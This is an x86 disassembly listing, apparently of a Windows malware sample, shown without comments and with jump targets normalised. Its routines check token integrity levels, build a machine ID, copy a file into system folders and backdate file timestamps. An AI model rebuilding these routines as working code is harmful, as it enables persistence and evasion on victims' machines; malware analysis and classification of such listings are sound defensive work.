add eax ecx
mov ecx eax
shr ecx 0x9
add eax ecx
mov ecx eax
shr ecx 0x5
add ecx eax
and ecx 0x3ff
lea eax [ ebp + ecx * 2 - 0x814 ]
movzx ebx [ eax ]
mov ecx esi
sub ecx ebx
mov [ eax ] si
and ecx 0x3ff
mov eax esi
sub eax ecx
cmp eax [ ebp + 0x8 ]
jb r-xdata
mov al [ esi ]
mov [ edi ] al
inc edi
inc esi
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ ecx ] eax
jmp r-xdata
mov [ ebp - 0x10 ] edi
mov [ edi ] 0x0
mov [ ebp - 0xc ] 0x1
inc edi
mov al [ esi ]
mov [ edi ] al
inc edi
inc esi
cmp eax esi
je r-xdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
leave
retn
mov bl [ esi ]
cmp bl [ eax ]
jne r-xdata
mov bl [ esi + 0x1 ]
cmp bl [ eax + 0x1 ]
jne r-xdata
mov bl [ esi + 0x2 ]
cmp bl [ eax + 0x2 ]
jne r-xdata
mov edx [ ebp - 0x10 ]
mov bl [ ebp - 0xc ]
or [ edx ] bl
mov [ ebp - 0x8 ] 0x3
lea edx [ esi + 0x3 ]
sub eax esi
mov al [ ebp - 0x8 ]
sub al 0x3
shl al 0x2
mov edx ecx
shr edx 0x8
or al dl
mov [ edi ] al
mov [ edi + 0x1 ] cl
add edi 0x2
add esi [ ebp - 0x8 ]
jmp r-xdata
inc [ ebp - 0x8 ]
inc edx
cmp [ ebp - 0x8 ] 0x42
jb r-xdata
mov bl [ edx ]
cmp bl [ eax + edx ]
jne r-xdata
sub_40d0b6
push esi
mov esi [ esp + 0xc ]
push edi
push [ esi + 0x4 ]
mov edi [ esp + 0x10 ]
lea eax [ edi + 0x24 ]
push eax
call [ lstrcmpiW@IAT ]
test eax eax
jne r-xdata
xor al al
mov eax [ edi + 0x8 ]
mov [ esi ] eax
mov al 0x1
jmp r-xdata
pop edi
pop esi
retn
sub_40d0df
push ebp
mov ebp esp
sub esp 0x2c
mov edx [ ebp + 0x8 ]
push ebx
xor ebx ebx
cmp [ edx + 0x58c4 ] 0xffffffff
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] 0x500
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x58c4 ]
pop ebx
leave
retn 0x4
push esi
mov esi rw-data
mov ecx 0x200
mov eax esi
mov [ eax ] bl
inc eax
dec ecx
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
push esi
mov [ edx + 0x58c4 ] ebx
mov [ ebp - 0x8 ] 0x100
call [ GetUserNameW@IAT ]
test eax eax
jne r-xdata
push edi
mov esi [ AllocateAndInitializeSid@IAT ]
lea eax [ ebp - 0xc ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x220
push 0x20
push 0x2
lea eax [ ebp - 0x2c ]
push eax
call esi
lea eax [ ebp - 0x10 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x223
push 0x20
push 0x2
lea eax [ ebp - 0x2c ]
push eax
call esi
lea eax [ ebp - 0x14 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x222
push 0x20
push 0x2
lea eax [ ebp - 0x2c ]
push eax
call esi
lea eax [ ebp - 0x18 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x12
push 0x1
lea eax [ ebp - 0x2c ]
push eax
call esi
lea eax [ ebp - 0x1c ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x13
push 0x1
lea eax [ ebp - 0x2c ]
push eax
call esi
lea eax [ ebp - 0x20 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x14
pop edi
push edi
push 0x1
lea eax [ ebp - 0x2c ]
push eax
call esi
mov eax [ ebp + 0x8 ]
mov esi [ CheckTokenMembership@IAT ]
mov [ eax + 0x58c4 ] edi
mov edi [ FreeSid@IAT ]
cmp [ ebp - 0xc ] ebx
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
push 0x5
push 0xffffffff
push ebx
call [ WTSQuerySessionInformationW@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
push [ ebp - 0xc ]
push ebx
call esi
test eax eax
je r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x24 ]
push esi
call sub_406530
add esp 0xc
push [ ebp - 0x24 ]
call [ WTSFreeMemory@IAT ]
cmp [ ebp - 0x14 ] ebx
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
push [ ebp - 0x10 ]
push ebx
call esi
test eax eax
je r-xdata
push [ ebp - 0xc ]
call edi
cmp [ ebp - 0x4 ] ebx
je r-xdata
cmp [ ebp - 0x18 ] ebx
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
push [ ebp - 0x14 ]
push ebx
call esi
test eax eax
je r-xdata
push [ ebp - 0x10 ]
call edi
cmp [ ebp - 0x4 ] ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x58c4 ] 0x28
cmp [ ebp - 0x1c ] ebx
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
push [ ebp - 0x18 ]
push ebx
call esi
test eax eax
je r-xdata
push [ ebp - 0x14 ]
call edi
cmp [ ebp - 0x4 ] ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x58c4 ] 0x1e
cmp [ ebp - 0x20 ] ebx
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
push [ ebp - 0x1c ]
push ebx
call esi
test eax eax
je r-xdata
push [ ebp - 0x18 ]
call edi
cmp [ ebp - 0x4 ] ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x58c4 ] 0xa
pop edi
pop esi
lea eax [ ebp - 0x4 ]
push eax
push [ ebp - 0x20 ]
push ebx
call esi
test eax eax
je r-xdata
push [ ebp - 0x1c ]
call edi
cmp [ ebp - 0x4 ] ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x58c4 ] 0x32
push [ ebp - 0x20 ]
call edi
cmp [ ebp - 0x4 ] ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x58c4 ] 0x34
mov eax [ ebp + 0x8 ]
mov [ eax + 0x58c4 ] 0x36
sub_40d34b
push ebp
mov ebp esp
sub esp 0x32c
push ebx
push esi
push edi
add eax 0x5738
xor edi edi
mov [ ebp - 0x20 ] 0x80
mov [ ebp - 0x14 ] eax
cmp eax edi
je r-xdata
xor al al
push eax
call sub_40ce2a
jmp r-xdata
mov eax [ rw-data ]
mov edx [ rw-data ]
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
or eax [ rw-data ]
jne r-xdata
test al al
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov esi 0x100
mov ecx esi
lea eax [ ebp - 0x120 ]
push [ ebp - 0x14 ]
call sub_40ce0a
mov [ eax ] 0x0
inc eax
dec ecx
jne r-xdata
push 0x104
lea eax [ ebp - 0x328 ]
push eax
call [ GetWindowsDirectoryW@IAT ]
push edi
push edi
push edi
xor eax eax
push edi
mov [ ebp - 0x322 ] ax
lea eax [ ebp - 0x18 ]
push eax
push edi
push edi
lea eax [ ebp - 0x328 ]
push eax
call [ GetVolumeInformationW@IAT ]
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x120 ]
push eax
push 0x6
call [ GetComputerObjectNameW@IAT ]
test al al
je r-xdata
push 0x10
xor eax eax
mov ebx r--data
pop esi
mov [ ebp - 0x1c ] esi
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x120 ]
push eax
call [ IIDFromString@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
call [ UuidCreate@IAT ]
push 0xffffffff
call sub_40e94e
movzx eax ax
xor [ ebp - 0x10 ] eax
push 0xffff
call sub_40e94e
or eax [ ebp - 0x10 ]
mov esi 0xff
xor [ ebp - 0xc ] ax
mov eax 0x1234
xor [ ebp - 0xa ] ax
push esi
call sub_40e94e
xor [ ebp - 0x8 ] al
push esi
call sub_40e94e
add al 0x64
xor [ ebp - 0x7 ] al
push esi
call sub_40e94e
sub al 0x11
xor [ ebp - 0x6 ] al
push esi
call sub_40e94e
mov cl 0x22
imul cl
xor [ ebp - 0x5 ] al
push esi
call sub_40e94e
add al 0x1d
xor [ ebp - 0x4 ] al
push esi
call sub_40e94e
sub al 0x61
xor [ ebp - 0x3 ] al
push esi
call sub_40e94e
mov cl 0x15
imul cl
xor [ ebp - 0x2 ] al
push esi
call sub_40e94e
mov esi [ ebp - 0x18 ]
add al 0xb
xor [ ebp - 0x1 ] al
push 0x10
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
call sub_4100a9
xor eax esi
xor ecx ecx
xor ecx [ ebp - 0xc ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] ecx
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push r--data
push ebx
push 0x80000001
lea edi [ ebp - 0x1c ]
call sub_40c4dc
test al al
je r-xdata
push esi
lea eax [ ebp - 0x120 ]
push eax
call sub_4100a9
xor eax [ ebp - 0x120 ]
xor ecx ecx
xor ecx [ ebp - 0x11c ]
jmp r-xdata
mov esi [ ebp - 0x18 ]
push 0x10
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
call sub_4100a9
xor ecx ecx
xor eax esi
jmp r-xdata
push 0x10
lea eax [ ebp - 0x10 ]
push eax
push 0x3
push r--data
push ebx
push 0x80000001
call sub_40c46e
push esi
lea eax [ ebp - 0x10 ]
push eax
call sub_4100a9
xor ecx ecx
xor eax [ ebp - 0x10 ]
mov [ rw-data ] ecx
mov [ rw-data ] eax
jmp r-xdata
xor ecx [ ebp - 0xc ]
sub_40d572
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x464
push ebx
push esi
mov esi edx
push edi
push esi
mov [ esp + 0x10 ] esi
mov [ esp + 0x14 ] ecx
call [ lstrlenW@IAT ]
test esi esi
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
xor al al
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov ebx [ ebp + 0x8 ]
test ebx ebx
js r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov edi [ lstrcpyW@IAT ]
push esi
lea eax [ esp + 0x1c ]
push eax
call edi
mov esi [ lstrcatW@IAT ]
push r--data
lea eax [ esp + 0x1c ]
push eax
call esi
lea eax [ esp + 0x220 ]
push eax
lea eax [ esp + 0x1c ]
push eax
call [ FindFirstFileW@IAT ]
mov [ esp + 0x14 ] eax
cmp eax 0xffffffff
je r-xdata
test [ esp + 0x220 ] 0x10
jne r-xdata
push r--data
lea eax [ esp + 0x250 ]
push eax
call [ lstrcmpW@IAT ]
test eax eax
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
lea eax [ esp + 0x220 ]
push eax
push [ esp + 0x18 ]
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
push r--data
lea eax [ esp + 0x250 ]
push eax
call [ lstrcmpW@IAT ]
test eax eax
je r-xdata
push 0x0
call [ Sleep@IAT ]
push [ ebp + 0x18 ]
lea eax [ esp + 0x224 ]
push eax
push [ esp + 0x14 ]
push [ esp + 0x1c ]
call [ ebp + 0x14 ]
add esp 0x10
test al al
je r-xdata
push [ esp + 0x14 ]
call [ FindClose@IAT ]
mov al 0x1
cmp [ ebp + 0x10 ] 0x0
je r-xdata
jmp r-xdata
test ebx ebx
jle r-xdata
push [ ebp + 0x18 ]
lea eax [ esp + 0x224 ]
push eax
push [ esp + 0x14 ]
push [ esp + 0x1c ]
call [ ebp + 0x14 ]
add esp 0x10
test al al
je r-xdata
push [ esp + 0xc ]
lea eax [ esp + 0x1c ]
push eax
call edi
push r--data
lea eax [ esp + 0x1c ]
push eax
call esi
lea eax [ esp + 0x24c ]
push eax
lea eax [ esp + 0x1c ]
push eax
call esi
push [ ebp + 0x18 ]
mov ecx [ esp + 0x14 ]
push [ ebp + 0x14 ]
lea eax [ ebx - 0x1 ]
push [ ebp + 0x10 ]
lea edx [ esp + 0x24 ]
push [ ebp + 0xc ]
push eax
call sub_40d572
sub_40d6ff
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x10 ] eax
je r-xdata
leave
retn 0xc
push eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ WriteFile@IAT ]
neg eax
sbb eax eax
and eax [ ebp - 0x4 ]
sub_40d72c
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] eax
jne r-xdata
cmp [ ebp + 0x10 ] eax
je r-xdata
xor eax eax
jmp r-xdata
push eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ ReadFile@IAT ]
neg eax
sbb eax eax
and eax [ ebp - 0x4 ]
leave
retn 0xc
sub_40d775
push ebp
mov ebp esp
sub eax 0x0
je r-xdata
xor eax eax
jmp r-xdata
dec eax
je r-xdata
push eax
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ SetFilePointer@IAT ]
cmp eax 0xffffffff
setne al
pop ebp
retn 0x8
xor eax eax
inc eax
jmp r-xdata
dec eax
jne r-xdata
mov eax [ ebp + 0xc ]
push 0x2
pop eax
jmp r-xdata
sub_40d7b3
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
xor ebx ebx
sub eax ebx
push esi
mov edx 0x80
je r-xdata
mov eax 0x80000000
push 0x3
jmp r-xdata
dec eax
je r-xdata
pop ecx
jmp r-xdata
mov edx 0x80000080
dec eax
je r-xdata
push ebx
push edx
push ecx
push ebx
push 0x3
push eax
push [ ebp + 0x8 ]
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov eax 0xc0000000
push 0x4
dec eax
je r-xdata
cmp [ ebp + 0xc ] 0x6
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov edx 0x80000080
dec eax
je r-xdata
mov eax esi
push 0x2
push ebx
push ebx
push esi
call [ SetFilePointer@IAT ]
cmp eax 0xffffffff
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x8
mov eax 0x40000000
push 0x2
jmp r-xdata
dec eax
je r-xdata
mov edx 0x80000080
dec eax
je r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0xc ]
sub_40d843
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push 0x0
push [ esp + 0x8 ]
call sub_40d7b3
cmp eax 0xffffffff
je r-xdata
xor al al
jmp r-xdata
push eax
call [ CloseHandle@IAT ]
mov al 0x1
retn 0x4
sub_40d86a
xor eax eax
push esi
cmp [ esp + 0xc ] eax
je r-xdata
xor al al
cmp [ esp + 0x8 ] eax
je r-xdata
push eax
push [ esp + 0xc ]
call sub_40d7b3
mov esi eax
cmp esi 0xffffffff
je r-xdata
push [ esp + 0xc ]
push esi
call [ GetFileSizeEx@IAT ]
test eax eax
je r-xdata
push esi
call [ CloseHandle@IAT ]
mov al 0x1
jmp r-xdata
pop esi
retn 0x8
sub_40d8aa
push ebp
mov ebp esp
sub esp 0x208
push edi
xor eax eax
push 0x206
mov [ ebp - 0x208 ] ax
xor edi edi
lea eax [ ebp - 0x206 ]
push edi
push eax
call sub_405830
add esp 0xc
cmp [ ebp + 0x8 ] edi
jne r-xdata
push esi
push edi
mov esi 0x104
push esi
lea eax [ ebp - 0x208 ]
push eax
call sub_41021b
movzx eax al
cmp eax edi
je r-xdata
xor eax eax
jmp r-xdata
push r--data
lea eax [ ebp - 0x208 ]
push eax
call [ lstrcpyW@IAT ]
cmp eax esi
jb r-xdata
pop edi
leave
retn 0x4
push [ ebp + 0x8 ]
lea eax [ ebp - 0x208 ]
push eax
call esi
lea edi [ ebp - 0x208 ]
call sub_40e7b9
pop esi
push r--data
lea eax [ ebp - 0x208 ]
push eax
call esi
lea eax [ ebp - 0x208 ]
push eax
call [ lstrlenW@IAT ]
cmp [ ebp + eax * 2 - 0x20a ] 0x5c
mov esi [ lstrcatW@IAT ]
je r-xdata
sub_40d957
push ebp
mov ebp esp
sub esp 0x208
push esi
push edi
xor eax eax
push 0x206
push eax
mov [ ebp - 0x208 ] ax
lea eax [ ebp - 0x206 ]
push eax
call sub_405830
add esp 0xc
call sub_4102c5
push eax
lea eax [ ebp - 0x208 ]
push eax
call [ lstrcpyW@IAT ]
lea eax [ ebp - 0x208 ]
push eax
call [ lstrlenW@IAT ]
mov esi [ lstrcatW@IAT ]
lea ecx [ ebp + eax * 2 - 0x20a ]
jmp r-xdata
cmp [ ecx ] 0x5c
jne r-xdata
dec eax
sub ecx 0x2
cmp eax 0x1
jbe r-xdata
cmp eax 0x1
jbe r-xdata
xor eax eax
mov [ ebp - 0x208 ] ax
cmp [ ebp + eax * 2 - 0x20a ] 0x5c
je r-xdata
push r--data
lea eax [ ebp - 0x208 ]
push eax
call esi
lea edi [ ebp - 0x208 ]
call sub_40e7b9
pop edi
pop esi
leave
retn
push r--data
lea eax [ ebp - 0x208 ]
push eax
call esi
jmp r-xdata
sub_40da04
push ebp
mov ebp esp
sub esp 0x208
push esi
xor eax eax
push 0x206
mov [ ebp - 0x208 ] ax
xor esi esi
lea eax [ ebp - 0x206 ]
push esi
push eax
call sub_405830
add esp 0xc
cmp [ ebp + 0x8 ] esi
jne r-xdata
lea eax [ ebp - 0x208 ]
push eax
push esi
push esi
push 0x1c
push esi
call [ SHGetFolderPathW@IAT ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x208 ]
push eax
call [ lstrlenW@IAT ]
cmp [ ebp + eax * 2 - 0x20a ] 0x5c
mov esi [ lstrcatW@IAT ]
je r-xdata
push r--data
lea eax [ ebp - 0x208 ]
push eax
call [ lstrcpyW@IAT ]
pop esi
leave
retn 0x4
push edi
push [ ebp + 0x8 ]
lea eax [ ebp - 0x208 ]
push eax
call esi
lea edi [ ebp - 0x208 ]
call sub_40e7b9
pop edi
push r--data
lea eax [ ebp - 0x208 ]
push eax
call esi
sub_40daa9
push ebp
mov ebp esp
sub esp 0x208
xor eax eax
push 0x206
push eax
mov [ ebp - 0x208 ] ax
lea eax [ ebp - 0x206 ]
push eax
call sub_405830
add esp 0xc
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
push edi
call sub_40e67d
mov esi 0x104
test al al
push esi
lea eax [ ebp - 0x208 ]
push eax
je r-xdata
xor eax eax
jmp r-xdata
call [ GetSystemDirectoryW@IAT ]
call [ GetSystemWow64DirectoryW@IAT ]
jmp r-xdata
leave
retn 0x4
push r--data
lea eax [ ebp - 0x208 ]
push eax
call [ lstrcpyW@IAT ]
cmp eax esi
jb r-xdata
test eax eax
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x208 ]
push eax
call esi
lea edi [ ebp - 0x208 ]
call sub_40e7b9
pop edi
pop esi
push r--data
lea eax [ ebp - 0x208 ]
push eax
call esi
lea eax [ ebp - 0x208 ]
push eax
call [ lstrlenW@IAT ]
cmp [ ebp + eax * 2 - 0x20a ] 0x5c
mov esi [ lstrcatW@IAT ]
je r-xdata
sub_40db66
push ebp
mov ebp esp
sub esp 0x288
test ebx ebx
jne r-xdata
push edi
push 0x20
push ebx
call [ SetFileAttributesW@IAT ]
mov edi [ DeleteFileW@IAT ]
push ebx
call edi
test eax eax
jne r-xdata
xor al al
jmp r-xdata
setne al
pop edi
cmp [ ebp + 0x8 ] al
je r-xdata
leave
retn 0x4
test eax eax
push esi
push 0x104
push ebx
lea eax [ ebp - 0x288 ]
push eax
call [ lstrcpynW@IAT ]
xor eax eax
push 0x7
lea esi [ ebp - 0x80 ]
mov [ ebp - 0x80 ] ax
call sub_40edc9
mov eax esi
push eax
lea eax [ ebp - 0x288 ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x288 ]
push eax
push ebx
call [ MoveFileW@IAT ]
pop esi
test eax eax
jne r-xdata
lea eax [ ebp - 0x288 ]
push eax
call edi
push ebx
call edi
sub_40dbf0
push ebp
mov ebp esp
sub esp 0xa8
cmp [ ebp + 0x8 ] 0x0
push ebx
push esi
push edi
mov [ ebp - 0x5 ] 0x0
jne r-xdata
push 0x2
lea eax [ ebp - 0xa4 ]
push eax
call sub_40ed67
push [ ebp + 0xc ]
lea eax [ ebp - 0xa4 ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0xa4 ]
push eax
call sub_40daa9
mov edi [ CopyFileW@IAT ]
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0xa4 ]
push eax
call sub_40da04
mov esi eax
test esi esi
je r-xdata
push 0x1
mov ebx esi
call sub_40db66
push 0x0
push esi
push [ ebp + 0x8 ]
call edi
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
lea eax [ ebp - 0xa4 ]
push eax
call sub_40d8aa
mov esi eax
test esi esi
je r-xdata
push 0x1
mov ebx esi
call sub_40db66
push 0x0
push esi
push [ ebp + 0x8 ]
call edi
test eax eax
jne r-xdata
test esi esi
jne r-xdata
push esi
call sub_412d05
xor esi esi
mov eax esi
push 0x1
mov ebx esi
call sub_40db66
xor ebx ebx
push ebx
push esi
push [ ebp + 0x8 ]
call edi
test eax eax
jne r-xdata
test esi esi
jne r-xdata
push esi
call sub_412d05
xor esi esi
xor ebx ebx
cmp esi ebx
je r-xdata
push esi
call sub_412d05
xor esi esi
push 0x2
push esi
call sub_40d7b3
mov [ ebp + 0x8 ] eax
cmp eax ebx
je r-xdata
or [ ebp + 0x8 ] 0xffffffff
jmp r-xdata
jmp r-xdata
push esi
call sub_412d05
xor esi esi
cmp [ ebp + 0x10 ] bl
je r-xdata
push 0x1d608e
call sub_40e94e
lea edi [ eax + 0x9cada ]
mov [ ebp - 0x20 ] ebx
cmp esi ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
call [ GetSystemTime@IAT ]
push 0x5
call sub_40e94e
xor ecx ecx
inc ecx
sub ecx eax
add [ ebp - 0x18 ] cx
push 0x6
call sub_40e94e
movzx ecx [ ebp - 0x16 ]
dec eax
sub ecx eax
jns r-xdata
push ebx
push ebx
push edi
push [ ebp + 0x8 ]
call [ SetFilePointer@IAT ]
lea eax [ ebp - 0x5 ]
mov [ ebp + 0x10 ] ebx
test eax eax
je r-xdata
sub [ ebp - 0x16 ] ax
push 0xc
pop ecx
sub ecx eax
add [ ebp - 0x16 ] cx
jmp r-xdata
push ebx
lea eax [ ebp + 0x10 ]
push eax
push 0x1
lea eax [ ebp - 0x5 ]
push eax
push [ ebp + 0x8 ]
call [ WriteFile@IAT ]
sub [ ebp - 0x12 ] ax
push 0x1e
pop ecx
sub ecx eax
add [ ebp - 0x12 ] cx
jmp r-xdata
push 0xf
call sub_40e94e
movzx ecx [ ebp - 0x12 ]
dec eax
sub ecx eax
jns r-xdata
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call [ SystemTimeToFileTime@IAT ]
lea eax [ ebp - 0x24 ]
push eax
push eax
push eax
push [ ebp + 0x8 ]
call [ SetFileTime@IAT ]
push [ ebp + 0x8 ]
call [ CloseHandle@IAT ]
jmp r-xdata
sub_40ddc7
mov eax sub_41aa37
call sub_416a8c
sub esp 0x220
push ebx
push esi
push edi
lea esi [ ebp - 0x24 ]
mov ebx ecx
call sub_40c9fb
and [ ebp - 0x4 ] 0x0
push 0x1
push 0x104
lea eax [ ebp - 0x22c ]
push eax
call sub_41021b
test al al
je r-xdata
xor bl bl
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_40ce6c
push 0x1
push eax
mov [ ebp - 0x14 ] eax
call sub_40c865
mov edi [ ebp - 0x24 ]
test edi edi
je r-xdata
xor al al
push [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push edi
lea eax [ ebp - 0x14 ]
call sub_4101be
jmp r-xdata
lea eax [ ebp - 0x22c ]
test eax eax
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp - 0x24 ]
call sub_40c938
xor al al
jmp r-xdata
test al al
jne r-xdata
push 0x2
lea eax [ ebp - 0x22c ]
push eax
call sub_40d7b3
mov esi eax
test esi esi
je r-xdata
or esi 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x8
test edi edi
je r-xdata
push esi
call [ CloseHandle@IAT ]
push [ ebp - 0x14 ]
push edi
push esi
call sub_40d6ff
test eax eax
je r-xdata
push esi
call [ CloseHandle@IAT ]
push ebx
call sub_40d843
test al al
je r-xdata
push ebx
lea eax [ ebp - 0x22c ]
push eax
call [ MoveFileW@IAT ]
test eax eax
je r-xdata
push 0x1
call sub_40db66
mov bl 0x1
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp - 0x24 ]
call sub_40c938
mov al bl
sub_40ded2
mov eax sub_41ac7b
call sub_416a8c
mov eax 0x12158
call sub_406c70
push ebx
push esi
push edi
call sub_40ed22
mov [ ebp - 0x24 ] eax
call sub_40ed22
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x50 ]
push eax
call sub_412634
and [ ebp - 0x4 ] 0x0
lea esi [ ebp - 0x60 ]
call sub_40c9fb
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x6c ]
push eax
push [ ebp + 0x14 ]
call sub_40d86a
test al al
je r-xdata
xor bl bl
cmp [ ebp - 0x68 ] 0x0
ja r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x18
mov [ ebp - 0x4 ] 0x0
lea esi [ ebp - 0x60 ]
call sub_40c938
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x50 ]
push eax
call sub_4125f1
xor al al
mov eax [ ebp - 0x6c ]
cmp eax 0xffffffff
jbe r-xdata
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x28 ] eax
test ecx ecx
je r-xdata
mov edi [ ebp + 0x18 ]
lea eax [ edi + 0x4 ]
push 0x8
pop esi
test eax eax
je r-xdata
mov [ ebp - 0x17 ] eax
lea eax [ ebp - 0x20 ]
push eax
push 0xd
pop edi
lea eax [ ebp - 0x4c ]
mov [ ebp - 0x20 ] 0x72682c0
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x1b ] 0x4
call sub_40cb2c
lea eax [ edi + 0x14 ]
test eax eax
je r-xdata
mov ebx [ ebp - 0x38 ]
push eax
mov edi esi
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x20 ] 0x6354ec21
mov [ ebp - 0x1c ] 0x4
mov [ ebp - 0x1b ] esi
call sub_40cb2c
lea eax [ ebp - 0x20 ]
push eax
push 0xd
pop edi
lea eax [ ebp - 0x4c ]
mov [ ebp - 0x17 ] ebx
call sub_40cb2c
mov edi [ ebp + 0x18 ]
mov ebx [ ebp + 0x14 ]
push ebx
call [ lstrlenW@IAT ]
lea ecx [ ebp - 0x50 ]
push ecx
mov edx ebx
mov ecx 0x1a2e71c0
call sub_412a64
test edi edi
je r-xdata
mov ebx [ ebp - 0x38 ]
push eax
mov edi esi
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x20 ] 0x6d49ed2e
mov [ ebp - 0x1c ] 0x4
mov [ ebp - 0x1b ] esi
call sub_40cb2c
lea eax [ ebp - 0x20 ]
push eax
push 0xd
pop edi
lea eax [ ebp - 0x4c ]
mov [ ebp - 0x17 ] ebx
call sub_40cb2c
mov edi [ ebp + 0x18 ]
lea eax [ ebp - 0x24 ]
test eax eax
je r-xdata
mov eax [ edi ]
mov [ ebp - 0x17 ] eax
lea eax [ ebp - 0x20 ]
push eax
push 0xd
pop edi
lea eax [ ebp - 0x4c ]
mov [ ebp - 0x20 ] 0x153b88ff
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x1b ] 0x4
call sub_40cb2c
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x17 ] eax
lea eax [ ebp - 0x20 ]
push eax
push 0xd
pop edi
lea eax [ ebp - 0x4c ]
mov [ ebp - 0x20 ] 0x1d2b8ef1
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x1b ] 0x4
call sub_40cb2c
lea eax [ ebp - 0x50 ]
push eax
lea ecx [ ebp - 0x60 ]
call sub_41289d
mov edi [ Sleep@IAT ]
push 0xa
call edi
xor esi esi
push esi
call edi
push [ ebp - 0x5c ]
push esi
push 0x28
push [ ebp - 0x2c ]
push esi
push [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
push [ ebp - 0x5c ]
push [ ebp - 0x60 ]
call sub_40ffc9
test al al
jne r-xdata
mov edi [ eax + 0x4 ]
test edi edi
jle r-xdata
test ebx ebx
je r-xdata
mov eax [ eax ]
